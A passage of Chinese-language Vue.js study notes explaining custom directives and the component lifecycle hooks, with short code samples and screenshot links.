<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>    上述代码效果：点击后创建了`input`框，并且获取了焦点<br><br>    * &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914000243753.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914000243753&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>    点击创建后，`input`框出现，但是没有默认获取焦点，因为还没有将创建的节点添加到`body`中，未添加到页面的节点不能这样！！！因为此时`parentElement`值为`null`<br><br>    * 类似需要放在节点创建添加之后的指令：<br><br>    &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914001543338.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914001543338&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>    创建`input`框后，将其背景色变为`#<span class="hljs-number">8080</span>ff`<br><br>    * 但是，并不是所有对创建但未添加的节点的操作都是无效的！<br><br>    &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914001305605.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914001305605&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>    创建的节点后，显示的结果背景为`#<span class="hljs-number">8080</span>ff`<br><br>    * 解答：指令与元素成功绑定时（一上来），`big`函数会被调用，绑定成功了仅仅代表在内存里建立了绑定关系，此时节点还没加载到页面上，所以`focus()`调用无效；当点击`button`后，`n`发生改变，导致VUE重新系解析模板。<br><br>##### 实现需求二<br><br>* Vue会在特殊的时刻调用不同的函数：<br>  * `bind`：当指令与元素成功绑定的时候调用<br>  * `inserted`：指令所在元素被插入页面时调用<br>  * `update`：指令所在模板被重新解析时调用<br><br>​	&lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914011109605.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914011109605&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>简写方式相当于只写了`bind`和`update`。<br><br>#### 注意事项<br><br>* 指令名<br><br>  &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914010536377.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914010536377&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>  &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914011159825.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914011159825&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>  原因：定义时的大写字母会被变为小写字母！！！<br><br>  * &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914011550066.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914011550066&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br><span class="hljs-title">    ![image-20210914011615662](https:</span>//gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-<span class="hljs-number">20210914011615662</span>.png)<br><br>  * 建议写法：<br><br>    &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914011733885.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914011733885&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>* 回调函数`this`问题<br><br>  &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914012110450.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914012110450&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>  &lt;img src=<span class="hljs-string">&quot;https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914012503843.png&quot;</span> alt=<span class="hljs-string">&quot;image-20210914012503843&quot;</span> style=<span class="hljs-string">&quot;zoom:80%;&quot;</span> /&gt;<br><br>  因为所有指令相关回调中的`this`都不是`vm`<br><br>* 局部指令与全局指令<br><br>  前面都是局部指令，下面定义全局指令：<br><br>  * 对象式：<br><br>    ```js<br>    Vue.directive(&#x27;fbind&#x27;,&#123;<br>                    bind(element, binding) &#123;<br>                        console.log(&#x27;bind&#x27;,this)<br>                        element.value = binding.value<br>                    &#125;,<br>                    inserted(element, binding) &#123;<br>                        element.focus()<br>                        console.log(&#x27;inserted&#x27;,this)<br>                    &#125;,<br>                    update(element, binding) &#123;<br>                        element.value = binding.value<br>                        console.log(&#x27;update&#x27;,this)<br>                    &#125;<br>                &#125;)<br></code></pre></td></tr></table></figure>
</code></pre>
</li>
<li><p>函数式：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">Vue.directive(<span class="hljs-string">&#x27;big&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">element, binding</span>) </span>&#123;<br>                element.innerHTML = binding.value * <span class="hljs-number">10</span>;<br>            &#125;)<br></code></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><ul>
<li><p>定义语法：</p>
<ul>
<li><p>局部指令：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> Vue(&#123;<br>	directives:&#123;指令名:配置对象&#125;<br>&#125;)<br></code></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">new</span> Vue(&#123;<br>	directives:&#123;函数名()&#123;&#125;&#125;<br>&#125;)<br></code></pre></td></tr></table></figure>
</li>
<li><p>全局指令：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">Vue.directive&#123;指令名,配置对象&#125;<br></code></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">Vue.directive&#123;指令名,回调函数&#125;<br></code></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>配置对象常见的3个回调</p>
<ul>
<li><code>bind</code>：当指令与元素成功绑定的时候调用</li>
<li><code>inserted</code>：指令所在元素被插入页面时调用</li>
<li><code>update</code>：指令所在模板被重新解析时调用</li>
</ul>
</li>
<li><p>备注</p>
<ul>
<li>指令定义时不加<code>v-</code>，但是使用时要加<code>v-</code></li>
<li>指令名如果是多个单词，要使用<code>kebab-case</code>命名方式，不要使用驼峰命名法</li>
</ul>
</li>
</ul>
<h3 id="1-28-Vue生命周期"><a href="#1-28-Vue生命周期" class="headerlink" title="1.28 Vue生命周期"></a>1.28 Vue生命周期</h3><h4 id="引入生命周期"><a href="#引入生命周期" class="headerlink" title="引入生命周期"></a>引入生命周期</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123;opacity : opacity&#125;&quot;</span>&gt;</span>miketaylorjuly123.cn<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>在这里，对象的属性名和数据名相同，可以使用对象的简写形式：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>miketaylorjuly123.cn<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure>

<hr>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914150932031.png" srcset="/img/loading.gif" lazyload alt="image-20210914150932031"></p>
<p>出现的问题：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/44.gif" srcset="/img/loading.gif" lazyload alt="44" style="zoom:80%;" />

<p>因为JS中小数计算不精确，例如<code>0.1 + 0.2 ！= 0.3</code></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914151425416.png" srcset="/img/loading.gif" lazyload alt="image-20210914151425416" style="zoom:80%;" />

<p>所以可能直接越过等于0的情况，导致<code>opacity</code>无法重置。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914151541276.png" srcset="/img/loading.gif" lazyload alt="image-20210914151541276" style="zoom:80%;" />

<p>这样虽然实现了功能，但是不够完美，因为处理逻辑在<code>Vue</code>外，而且中间变量<code>vm</code>占用内存，因此不推荐。</p>
<hr>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--准备一个容器--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>miketaylorjuly123.cn<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>        &#123;&#123;change()&#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">    Vue.config.productionTip = <span class="hljs-literal">false</span>;<span class="hljs-comment">// 阻止VUE启动时生成生产提示。</span></span><br><span class="javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> Vue(&#123;</span><br><span class="javascript">        el: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br>        data: &#123;<br>            opacity: 1<br>        &#125;,<br>        methods: &#123;<br><span class="javascript">            <span class="hljs-function"><span class="hljs-title">change</span>(<span class="hljs-params"></span>)</span> &#123;</span><br><span class="javascript">                <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="javascript">                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;开启了定时器&#x27;</span>)</span><br><span class="javascript">                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.opacity &lt;= <span class="hljs-number">0</span>) <span class="hljs-built_in">this</span>.opacity = <span class="hljs-number">1</span></span><br><span class="javascript">                    <span class="hljs-built_in">this</span>.opacity -= <span class="hljs-number">0.01</span></span><br>                &#125;, 10)<br>            &#125;<br>        &#125;<br>    &#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/45.gif" srcset="/img/loading.gif" lazyload alt="45"></p>
<p>产生这种效果的原因：<code>opacity</code>发生变化，<code>Vue</code>重新解析模板，然后导致<code>change()</code>被调用，而且还是指数式爆炸增长。</p>
<hr>
<p>mounted：vue完成模板的解析，并把<strong>初始</strong>真实的DOM元素放入页面后，调用mounted()，即挂载完毕，只会被调用一次（后面的叫更新）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--准备一个容器--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>miketaylorjuly123.cn<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">    Vue.config.productionTip = <span class="hljs-literal">false</span>;<span class="hljs-comment">// 阻止VUE启动时生成生产提示。</span></span><br><span class="javascript">    <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> Vue(&#123;</span><br><span class="javascript">        el: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br>        data: &#123;<br>            opacity: 1<br>        &#125;, <br>        mounted () &#123;<br><span class="javascript">            <span class="hljs-built_in">setInterval</span>( <span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="javascript">                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.opacity &lt;= <span class="hljs-number">0</span>) <span class="hljs-built_in">this</span>.opacity = <span class="hljs-number">1</span></span><br><span class="javascript">                    <span class="hljs-built_in">this</span>.opacity -= <span class="hljs-number">0.01</span></span><br>                &#125;, 10)<br>        &#125;<br>    &#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>注意：<code>mounted</code>函数的<code>this</code>是<code>vm</code></p>
<p>mounted函数只是Vue生命周期函数中的一个</p>
<h5 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h5><ul>
<li><p>又名：生命周期回调函数、生命周期函数、生命周期钩子</p>
</li>
<li><p>是什么：<code>Vue</code>在关键时刻帮我们调用的一些特殊名称的函数</p>
</li>
<li><p>生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的</p>
</li>
<li><p>生命周期函数中的<code>this</code>指向是<code>vm</code>或组件实例对象</p>
</li>
</ul>
<h4 id="生命周期图示"><a href="#生命周期图示" class="headerlink" title="生命周期图示"></a>生命周期图示</h4><p><img src="https://cn.vuejs.org/images/lifecycle.png" srcset="/img/loading.gif" lazyload alt="Vue 实例生命周期"></p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914161411776.png" srcset="/img/loading.gif" lazyload alt="image-20210914161411776"></p>
<h4 id="创建流程"><a href="#创建流程" class="headerlink" title="创建流程"></a>创建流程</h4><p>学会使用<code>debugger;</code>卡断点</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">beforeCreate</span>(<span class="hljs-params"></span>)</span>&#123;<br>              <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;beforeCreate&#x27;</span>);<br>              <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>)<br>              <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.n);<br>              <span class="hljs-keyword">debugger</span>;<br>          &#125;<br></code></pre></td></tr></table></figure>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914162539488.png" srcset="/img/loading.gif" lazyload alt="image-20210914162539488" style="zoom:80%;" />

<p>数据代理没有开始，<code>vm</code>上看不到<code>_data</code>和定义的函数</p>
<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914164427084.png" srcset="/img/loading.gif" lazyload alt="image-20210914164427084" style="zoom:80%;" />

<p>可以访问定义的函数和<code>_data</code></p>
<h4 id="挂载流程"><a href="#挂载流程" class="headerlink" title="挂载流程"></a>挂载流程</h4><p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914164808699.png" srcset="/img/loading.gif" lazyload alt="image-20210914164808699"></p>
<p>编译<code>el</code>的外部HTML作为模板。</p>
<ul>
<li><p>外部HTML理解：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914165031975.png" srcset="/img/loading.gif" lazyload alt="image-20210914165031975" style="zoom:80%;" />

<p>红色框部分是模板，证明：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914165138943.png" srcset="/img/loading.gif" lazyload alt="image-20210914165138943" style="zoom:80%;" />

</li>
</ul>
<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914170016777.png" srcset="/img/loading.gif" lazyload alt="image-20210914170016777" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914165953661.png" srcset="/img/loading.gif" lazyload alt="image-20210914165953661" style="zoom:80%;" />

<p><code>Vue</code>已经解析了模板，生成了虚拟DOM，但是页面呈现的仍然是未经<code>Vue</code>编译的DOM</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914170242871.png" srcset="/img/loading.gif" lazyload alt="image-20210914170242871" style="zoom:80%;" />

<p>创建<code>vm.$el</code>（虚拟DOM转为真实DOM后的备份），然后用它替换掉整个<code>el</code></p>
<p style="color:red;">注意：此时所有对DOM的操作，<strong style="color:#8080ff">最终</strong>strong>都是不奏效的！！！</p>

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/46.gif" srcset="/img/loading.gif" lazyload alt="46" style="zoom:80%;" />

<p>原因：得到虚拟DOM后，往<code>vm.$el</code>复制一份后，随后转为真实DOM插入页面，所以在<code>beforeMount</code>中操作DOM最终会被覆盖，是无效的。</p>
<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914171811628.png" srcset="/img/loading.gif" lazyload alt="image-20210914171811628" style="zoom:80%;" />

<ul>
<li>此时：<ul>
<li>页面中呈现的是经过Vue编译的DOM。</li>
<li>对DOM的操作均有效(尽可能避免)至此初始化过程结束，一 般在此进行： 开启定时器、发送网络请求、订阅消息、绑定自定义事件、等初始化操作。</li>
</ul>
</li>
</ul>
<hr>
<p>没有el配置项，或者没有<code>vm.$mount</code>，就会停在<code>created</code>处。</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914172804240.png" srcset="/img/loading.gif" lazyload alt="image-20210914172804240" style="zoom:80%;" />

<p>证明：删除上述配置后，有：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914172444599.png" srcset="/img/loading.gif" lazyload alt="image-20210914172444599" style="zoom:80%;" />

<hr>
<p><code>template</code>模板用法</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914172910350.png" srcset="/img/loading.gif" lazyload alt="image-20210914172910350" style="zoom:80%;" />

<p>或</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914173018005.png" srcset="/img/loading.gif" lazyload alt="image-20210914173018005" style="zoom:80%;" />

<p>第二种方法可以<code>Enter</code>回车换行，而第一种不行(用<code>&#39;</code>和用`` `的区别)</p>
<p>问题1：</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914172935329.png" srcset="/img/loading.gif" lazyload alt="image-20210914172935329"></p>
<p>模板编译失败，因为：直接使用<code>template</code>配置项，只能有一个根节点！！！</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914173346141.png" srcset="/img/loading.gif" lazyload alt="image-20210914173346141" style="zoom:80%;" />

<p>问题2：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914173444072.png" srcset="/img/loading.gif" lazyload alt="image-20210914173444072" style="zoom:80%;" />

<p>原来的<code>#root</code>消失了，因为整个<code>template</code>中的内容i将<code>div#root</code>中的内容完全替换掉了(outHTML)</p>
<p>问题3：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914202502737.png" srcset="/img/loading.gif" lazyload alt="image-20210914202502737" style="zoom:80%;" />

<p>不要企图将<code>template</code>作为组件<code>root</code></p>
<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914173714294.png" srcset="/img/loading.gif" lazyload alt="image-20210914173714294" style="zoom:80%;" />

<p>使用<code>render</code>函数进行渲染</p>
<h4 id="更新流程"><a href="#更新流程" class="headerlink" title="更新流程"></a>更新流程</h4><p>创建<code>vm.$el</code>并保存的目的：<code>Vue</code>进行新旧DOM比较时，对于可以复用的节点，应该得有保存了的之前的节点，才能实现复用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.$el <span class="hljs-keyword">instanceof</span> HTMLElement); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure>

<hr>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914203527735.png" srcset="/img/loading.gif" lazyload alt="image-20210914203527735"></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914203639557.png" srcset="/img/loading.gif" lazyload alt="image-20210914203639557" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/47.gif" srcset="/img/loading.gif" lazyload alt="47" style="zoom:80%;" />

<p>在哪个生命周期钩子中页面和数据尚未保持同步？<code>beforeUpdate</code></p>
<p>然后进行虚拟DOM重新渲染，新旧虚拟DOM对比</p>
<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914204509382.png" srcset="/img/loading.gif" lazyload alt="image-20210914204509382" style="zoom:80%;" />

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/48.gif" srcset="/img/loading.gif" lazyload alt="48"></p>
<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914212548554.png" srcset="/img/loading.gif" lazyload alt="image-20210914212548554" style="zoom:80%;" />

<p>注意：不会递归，前后的n值相等，不算更新，但是如果换成<code>this.n++</code>，就会陷入递归中，所以千万小心在<code>updated</code>中改变数据的操作</p>
<h4 id="销毁流程"><a href="#销毁流程" class="headerlink" title="销毁流程"></a>销毁流程</h4><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914205302884.png" srcset="/img/loading.gif" lazyload alt="image-20210914205302884" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914210849140.png" srcset="/img/loading.gif" lazyload alt="image-20210914210849140" style="zoom:80%;" />

<p>​    <code>vm</code>销毁会引起销毁它的子组件</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914205613673.png" srcset="/img/loading.gif" lazyload alt="image-20210914205613673" style="zoom:80%;" />

<hr>
<p>解绑全部指令</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/49.gif" srcset="/img/loading.gif" lazyload alt="49" style="zoom:80%;" />

<hr>
<p>解绑事件监听器</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914210101590.png" srcset="/img/loading.gif" lazyload alt="image-20210914210101590" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/50.gif" srcset="/img/loading.gif" lazyload alt="50" style="zoom:80%;" />

<ul>
<li><p>是否与官网描述相悖？</p>
<p>官网的事件监听器指的是<strong>自定义事件</strong>，而不是原生DOM事件。对于点击事件，最终Vue会使用正常的DOM事件去给<code>button</code>进行绑定，一旦绑定完成，以后将无法撤销。<code>vm</code>被销毁不会引起点击事件失效，因为它属于原生DOM事件。</p>
</li>
</ul>
<p>销毁后<code>watch</code>监听失效</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/51.gif" srcset="/img/loading.gif" lazyload alt="51" style="zoom:80%;" />

<hr>
<p>销毁后，仍然可以访问数据：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914211723221.png" srcset="/img/loading.gif" lazyload alt="image-20210914211723221" style="zoom:80%;" />

<hr>
<p>易错易混：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914212240887.png" srcset="/img/loading.gif" lazyload alt="image-20210914212240887" style="zoom:80%;" />

<p>此时对数据的修改不会触发页面更新</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210914212128469.png" srcset="/img/loading.gif" lazyload alt="image-20210914212128469" style="zoom:80%;" />

<h4 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h4><p>注意：<code>beforeCreat/created</code>不是指<code>vm</code>创建之前/创建完毕（因为此时的this是<code>vm</code>），指的是数据监测、数据代理创建之前/创建完毕。</p>
<hr>
<p>需求：提供停止变换按钮</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;body&gt;<br>    &lt;!--准备一个容器--&gt;<br>    &lt;div id=<span class="hljs-string">&quot;root&quot;</span>&gt;<br>        &lt;h2 :style=<span class="hljs-string">&quot;&#123;opacity&#125;&quot;</span>&gt;miketaylorjuly123.cn&lt;/h2&gt;<br>        &lt;button @click=<span class="hljs-string">&quot;stop&quot;</span>&gt; 停止变换&lt;/button&gt;<br>    &lt;/div&gt;<br>&lt;/body&gt;<br>&lt;script&gt;<br>    Vue.config.productionTip = <span class="hljs-literal">false</span>;<span class="hljs-comment">// 